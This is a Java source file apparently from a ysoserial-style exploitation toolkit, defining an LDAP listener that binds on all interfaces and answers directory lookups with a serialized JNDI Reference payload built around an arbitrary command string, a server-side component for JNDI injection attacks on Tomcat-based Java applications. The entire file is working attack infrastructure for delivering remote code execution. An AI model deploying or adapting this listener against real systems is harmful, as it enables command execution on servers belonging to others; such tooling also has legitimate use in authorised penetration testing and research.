package ysoserial.exploit.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.LDAPException;
import ysoserial.Serializer;
import ysoserial.exploit.ldap.component.LocalChainOperationInterceptor;
import ysoserial.bullet.jndi.ReferencePayload;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LDAPTomcatRefListener {
    private InMemoryDirectoryServer ds;

    public LDAPTomcatRefListener(int lport, ReferencePayload ref, String command) throws Exception {
        InMemoryDirectoryServerConfig config = null;
        config = new InMemoryDirectoryServerConfig("dc=fasdqa" + ",dc=com");
        config.setListenerConfigs(new InMemoryListenerConfig(
            "listen", //$NON-NLS-1$
            InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
            lport,
            ServerSocketFactory.getDefault(),
            SocketFactory.getDefault(),
            (SSLSocketFactory) SSLSocketFactory.getDefault()));
        config.addInMemoryOperationInterceptor(
            new LocalChainOperationInterceptor(Serializer.serialize(ref.getReference(command))));
        ds = new InMemoryDirectoryServer(config);
    }

    public void run() throws LDAPException {
        ds.startListening();
    }
}
